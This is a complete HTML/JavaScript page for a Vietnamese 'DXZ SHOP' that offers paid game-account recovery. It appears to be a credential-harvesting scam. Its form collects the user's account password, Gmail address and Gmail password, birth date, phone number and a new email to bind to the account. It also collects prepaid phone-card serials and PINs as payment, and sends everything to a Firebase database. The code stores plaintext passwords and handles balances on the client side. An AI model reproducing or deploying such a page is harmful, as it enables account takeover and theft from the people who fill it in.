<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DXZ SHOP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
    <style>
        body { background-color: #0f172a; color: white; font-family: sans-serif; }
        .tab-active { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
        marquee { background: rgba(59, 130, 246, 0.1); padding: 5px; font-size: 11px; font-weight: bold; color: #60a5fa; }
    </style>
</head>
<body>
    <div id="auth-screen" class="min-h-screen flex items-center justify-center p-4">
        <div class="bg-slate-800 p-8 rounded-3xl w-full max-w-md border border-slate-700 text-center">
            <h2 class="text-2xl font-black mb-6 italic text-blue-500 uppercase tracking-widest">DXZ SHOP</h2>
            <input type="text" id="auth-user" placeholder="Tên đăng nhập" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-2xl mb-3 outline-none focus:border-blue-500">
            <input type="password" id="auth-pass" placeholder="Mật khẩu" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-2xl mb-4 outline-none focus:border-blue-500">
            <div class="flex gap-2">
                <button onclick="auth('reg')" class="flex-1 bg-slate-700 py-4 rounded-2xl font-bold uppercase text-xs">Đăng ký</button>
                <button onclick="auth('login')" class="flex-1 bg-blue-600 py-4 rounded-2xl font-bold shadow-lg uppercase text-xs">Đăng nhập</button>
            </div>
        </div>
    </div>

    <div id="main-app" class="hidden min-h-screen flex flex-col">
        <marquee id="shop-announcement">Chào mừng bạn đến với Dxz Shop!</marquee>

        <header class="p-4 flex justify-between items-center border-b border-slate-800 bg-[#0f172a] sticky top-0 z-50">
            <div class="flex items-center gap-3">
                <span class="text-2xl font-black text-blue-500 italic uppercase">Dxz Shop</span>
                <button id="btn-receive" onclick="openResultModal()" class="hidden bg-green-600 px-3 py-1.5 rounded-lg text-[10px] font-black uppercase animate-bounce">NHẬN ACC</button>
            </div>
            <div class="text-yellow-400 font-bold text-sm bg-slate-900 px-4 py-2 rounded-full border border-slate-700">
                <span id="balance">0</span>đ
            </div>
        </header>

        <nav class="flex justify-around text-[10px] font-black border-b border-slate-800 uppercase bg-slate-900/50">
            <button onclick="showTab('recovery')" id="nav-recovery" class="p-4 tab-active flex-1">Lấy lại Acc</button>
            <button onclick="showTab('topup')" id="nav-topup" class="p-4 text-slate-500 flex-1">Nạp tiền</button>
        </nav>

        <main class="flex-1 p-4 max-w-md mx-auto w-full pb-10">
            <section id="p-recovery" class="space-y-4">
                <div class="bg-blue-600 p-3 rounded-2xl text-center font-black text-[10px] uppercase shadow-lg">Phí dịch vụ: 11,000đ</div>
                <div class="bg-slate-800/50 p-5 rounded-3xl border border-slate-700 space-y-3 shadow-xl">
                    <input type="text" id="rec-1" placeholder="1. Lí do mất acc" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <div class="grid grid-cols-2 gap-2">
                        <input type="text" id="rec-2" placeholder="2. Tên đăng nhập" class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                        <input type="text" id="rec-3" placeholder="3. Mật khẩu  " class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    </div>
                    <input type="text" id="rec-4" placeholder="4. Ngày sinh" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    <div class="grid grid-cols-2 gap-2">
                        <input type="text" id="rec-5" placeholder="5. Gmail  " class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                        <input type="text" id="rec-6" placeholder="6. Pass Gmail  " class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    </div>
                    <input type="text" id="rec-7" placeholder="7. Số điện thoại" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    <input type="text" id="rec-8" placeholder="8. Mạng xã hội liên hệ" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    <input type="text" id="rec-9" placeholder="9. GMAIL MỚI CẦN GẮN VÀO ACC" class="w-full bg-slate-900 p-3 rounded-xl text-sm border-2 border-blue-500 outline-none font-bold text-yellow-400">
                    <button onclick="submitRecovery()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-sm uppercase shadow-lg active:scale-95 transition-all">Gửi đơn</button>
                </div>
            </section>

            <section id="p-topup" class="hidden space-y-4">
                <div class="bg-slate-800/50 p-5 rounded-3xl border border-slate-700 space-y-3 shadow-xl">
                    <p class="text-slate-400 font-bold text-[10px] uppercase text-center underline">Nạp Thẻ Cào</p>
                    <select id="card-type" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none"><option>Viettel</option><option>Zing</option><option>Mobi</option><option>Vina</option></select>
                    <select id="card-price" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none"><option value="10000">10,000đ</option><option value="20000">20,000đ</option><option value="50000">50,000đ</option><option value="100000">100,000đ</option></select>
                    <input type="text" id="card-seri" placeholder="Số Seri" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    <input type="text" id="card-pin" placeholder="Mã thẻ" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700">
                    <button onclick="submitCard()" class="w-full bg-green-600 py-3 rounded-xl font-black uppercase text-[10px]">Gửi thẻ</button>
                </div>
            </section>
        </main>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBHo70-xMpsutE9nqWXZZMlmxfjBsyi37Y",
            authDomain: "dxzshop-c73de.firebaseapp.com",
            databaseURL: "https://dxzshop-c73de-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "dxzshop-c73de"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentUser = null;

        async function auth(type) {
            const u = document.getElementById('auth-user').value.trim().toLowerCase();
            const p = document.getElementById('auth-pass').value.trim();
            if(!u || !p) return alert("Nhập đủ thông tin!");
            const snap = await db.ref('users/' + u).get();
            if(type === 'reg') {
                if(snap.exists()) return alert("Tài khoản đã tồn tại!");
                await db.ref('users/' + u).set({ pass: p, balance: 0 });
                alert("Đăng ký thành công!");
            } else {
                if(snap.exists() && snap.val().pass === p) {
                    currentUser = u;
                    document.getElementById('auth-screen').classList.add('hidden');
                    document.getElementById('main-app').classList.remove('hidden');
                    listenCloud();
                } else alert("Sai tài khoản!");
            }
        }

        function listenCloud() {
            db.ref('users/' + currentUser).on('value', snap => {
                const data = snap.val();
                document.getElementById('balance').innerText = (data.balance || 0).toLocaleString();
                if(data.message) document.getElementById('btn-receive').classList.remove('hidden');
                else document.getElementById('btn-receive').classList.add('hidden');
            });
            db.ref('settings/announcement').on('value', snap => {
                document.getElementById('shop-announcement').innerText = snap.val() || "Chào mừng bạn đến với Dxz Shop!";
            });
        }

        async function submitCard() {
            const type = document.getElementById('card-type').value;
            const price = document.getElementById('card-price').value;
            const seri = document.getElementById('card-seri').value.trim();
            const pin = document.getElementById('card-pin').value.trim();
            if(!seri || !pin) return alert("Nhập mã thẻ!");
            await db.ref('cards').push({ user: currentUser, type, price, seri, pin, time: new Date().toLocaleString() });
            alert("Đã gửi thẻ!");
        }

        async function submitRecovery() {
            const snap = await db.ref('users/' + currentUser).get();
            const bal = snap.val().balance || 0;
            if(bal < 11000) return alert("Cần nạp 11k!");
            const data = []; for(let i=1; i<=9; i++) data.push(document.getElementById('rec-'+i).value);
            await db.ref('users/' + currentUser + '/balance').set(bal - 11000);
            await db.ref('recovery').push({ user: currentUser, data, time: new Date().toLocaleString() });
            alert("Gửi đơn thành công!");
        }

        function showTab(t) {
            document.getElementById('p-recovery').classList.toggle('hidden', t!=='recovery');
            document.getElementById('p-topup').classList.toggle('hidden', t!=='topup');
            document.getElementById('nav-recovery').classList.toggle('tab-active', t==='recovery');
            document.getElementById('nav-topup').classList.toggle('tab-active', t==='topup');
        }
    </script>
</body>
</html>
